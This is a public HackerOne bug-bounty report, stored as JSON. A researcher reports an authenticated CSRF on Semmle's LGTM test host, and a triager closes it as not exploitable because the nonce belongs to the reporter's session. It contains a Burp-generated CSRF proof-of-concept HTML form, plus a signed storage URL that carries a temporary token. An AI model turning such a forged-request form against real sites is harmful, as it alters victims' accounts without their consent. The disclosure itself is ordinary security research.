{"id":505595,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDU1OTU=","url":"https://hackerone.com/reports/505595","title":"Authenticated Cross-Site-Request-Forgery","state":"Closed","substate":"not-applicable","severity_rating":"medium","readable_substate":"N/A","created_at":"2019-03-06T13:14:04.267Z","submitted_at":"2019-03-06T13:14:04.267Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"drspitfire","url":"/drspitfire","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27264,"url":"https://hackerone.com/semmle","handle":"semmle","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Semmle","twitter_handle":"semmle","website":"https://semmle.com","about":"Semmle's engineering analytics platform helps leading technology companies and open-source developers build secure, reliable software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":true,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-03-19T13:13:44.236Z","bug_reporter_agreed_on_going_public_at":"2019-03-07T09:01:11.895Z","team_member_agreed_on_going_public_at":"2019-03-19T13:13:44.192Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Summary:\nI have read the T\u0026C to be eligible for bounty on this program. As per T\u0026C authenticated CSRF requests are eligible for a bounty. I am not looking for the Bounty, However I want to give you an update on Authenticated CSRF that I have found. \nIn the \"Account Settings\", a user can change his username, Location, Website and Company name. This information can be changed by an adversary using CSRF attack.  Please follow given below steps.\n\n\nSteps To Reproduce:\nStep1: Copy and Paste below code and save it as an HTML file. \n-----------------------------------------------------------------------------------------------------------\n\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n  \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e\n    \u003cform action=\"https://lgtm-com.pentesting.semmle.net/internal_api/v0.2/savePublicInformation\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"name\" value=\"Wasim\u0026#32;Shaikh\" /\u003e\n      \u003cinput type=\"hidden\" name=\"username\" value=\"spitfirehunt\" /\u003e\n      \u003cinput type=\"hidden\" name=\"location\" value=\"Jeddah\" /\u003e\n      \u003cinput type=\"hidden\" name=\"website\" value=\"https\u0026#58;\u0026#47;\u0026#47;spitfirehunt\u0026#46;blogspot\u0026#46;com\" /\u003e\n      \u003cinput type=\"hidden\" name=\"organization\" value=\"Blogspot\" /\u003e\n      \u003cinput type=\"hidden\" name=\"nonce\" value=\"5c04dc5f1a3327b091ecff05604bca8d22233583d0a632a01b16de290efe38b6a4fd5117fcb1d33534356da3c3242de2c236df52cb8a222c6e772c46fc64c2a2\" /\u003e\n      \u003cinput type=\"hidden\" name=\"apiVersion\" value=\"6526f3837c6050e2cc7ab97e8abf9cd01f4c7002\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n------------------------------------------------------------------------------------------------------------\n\nStep2: Login using your legitimate account @LGTM-  https://lgtm-com.pentesting.semmle.net \n\nStep3: Open HTML file using same browser where you have an active session for LGTM. \n\nStep4: Click on \"Submit\" button and your information in personal profile will be changed.\n\nKindly let me know if you are able to reproduce the issue or not.\n\n## Impact\n\nSecurity Impact:\n\n1: Changing the username of a user on his behalf.\n2: Adding a malicious website's link to a user's account.\n3: User might visit malicious websites considering it is there on his account to check it and thus, end up downloading malicious software on his machine, phishing attacks or much more.","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":8,"voters":["base_64","c0rv4x","khizer47","cr4xerbik4sh","drspitfire","behappy","cat_dog","reddmist"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":8552,"asset_type":"URL","asset_identifier":"lgtm-com.pentesting.semmle.net","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4267742,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I again checked, nonce value can be used only once. Thus use unused nonce value.\n\nTry this one.\n\n\"8aba92a808a1facde8fb89c044d2a1012cec232c665f48170da784135fd4bec91a4cba926d9609adf91a8290ae24a57a9457951405845774fce564a9fe1a352a\"\n\n\nThanks.","automated_response":false,"created_at":"2019-03-06T13:29:12.694Z","updated_at":"2019-03-06T13:29:12.694Z","actor":{"username":"drspitfire","cleared":false,"url":"/drspitfire","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4268507,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Hi @drspitfire,\n\nThank you for your submission. Although your finding might appear to be a security vulnerability, after reviewing your submission it appears this behavior does not pose a concrete and exploitable risk to the platform, as the nonce can only be used once and belongs to your session, making CSRF attacks unfeasible. Your effort is nonetheless appreciated and we wish that youâ€™ll continue to research, and submit any future security issues you find.\n\nCheers,\n@still ","automated_response":false,"created_at":"2019-03-06T15:01:55.400Z","updated_at":"2019-03-06T15:01:55.400Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4272641,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","automated_response":false,"created_at":"2019-03-07T06:26:52.028Z","updated_at":"2019-03-07T06:26:52.028Z","actor":{"username":"drspitfire","cleared":false,"url":"/drspitfire","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4272642,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you think Nonce value can be used only once, I would like to share a Video POC, where I can use same Nonce value more than once.\n\nKindly let me know. ","automated_response":false,"created_at":"2019-03-07T06:26:52.081Z","updated_at":"2019-03-07T06:26:52.081Z","actor":{"username":"drspitfire","cleared":false,"url":"/drspitfire","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4272673,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I just made Video POC to prove my point that nonce value can be used twice.\nWhat did I do in video?\nWebsite's name was https://spitfirehunt.blogspot3.com.\nI used nonce to change it to https://spitfirehunt.blogspot.com\nI used same nonce to change it to https://spitfirehunt.blogspot2.com\n\nThank you. \n","automated_response":false,"created_at":"2019-03-07T06:39:46.896Z","updated_at":"2019-03-07T06:39:46.896Z","actor":{"username":"drspitfire","cleared":false,"url":"/drspitfire","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":436773,"filename":"Use_Nonce_value_more_than_twice-_CSRF_POC.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/436/773/bdb5c59039ec64ff348ad7b4cce983ec6b0f6775/Use_Nonce_value_more_than_twice-_CSRF_POC.mp4?response-content-disposition=attachment%3B%20filename%3D%22Use_Nonce_value_more_than_twice-_CSRF_POC.mp4%22%3B%20filename%2A%3DUTF-8%27%27Use_Nonce_value_more_than_twice-_CSRF_POC.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150723Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5a8124d968362a1aa754f2b6bb314349e908a41c239684c2afea5e902e103635"}],"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4274010,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@drspitfire, the nonce value is only valid for your account. Can you use the CSRF against another account you don't own?","automated_response":false,"created_at":"2019-03-07T08:51:42.614Z","updated_at":"2019-03-07T08:51:42.614Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4274056,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I will create one more account and will try to find it.\n\nHowever, I hope after watching video, you were convinced that nonce value is reusable. \n\nThank you.","automated_response":false,"created_at":"2019-03-07T08:55:59.277Z","updated_at":"2019-03-07T08:55:59.277Z","actor":{"username":"drspitfire","cleared":false,"url":"/drspitfire","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4274062,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It doesn't matter if you can use it once or 1000 times, @drspitfire, if you can only use it on yourself.","automated_response":false,"created_at":"2019-03-07T08:56:40.697Z","updated_at":"2019-03-07T08:56:40.697Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4274073,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hmmm. Let's disclose it. Someone might take it to next level.\n\nThank you!","automated_response":false,"created_at":"2019-03-07T08:58:12.831Z","updated_at":"2019-03-07T08:58:12.831Z","actor":{"username":"drspitfire","cleared":false,"url":"/drspitfire","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4274089,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"@drspitfire, as this submission is invalid and does not constitute a vulnerability, it will be closed.\n\nWishing you the best of luck in your future efforts,\n@still","automated_response":false,"created_at":"2019-03-07T08:59:27.254Z","updated_at":"2019-03-07T08:59:27.254Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4274114,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-07T09:01:11.918Z","updated_at":"2019-03-07T09:01:11.918Z","first_to_agree":true,"actor":{"username":"drspitfire","cleared":false,"url":"/drspitfire","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4352759,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-19T13:13:44.210Z","updated_at":"2019-03-19T13:13:44.210Z","actor":{"username":"jmdh","cleared":false,"url":"/jmdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4352760,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-03-19T13:13:44.253Z","updated_at":"2019-03-19T13:13:44.253Z","actor":{"username":"jmdh","cleared":false,"url":"/jmdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}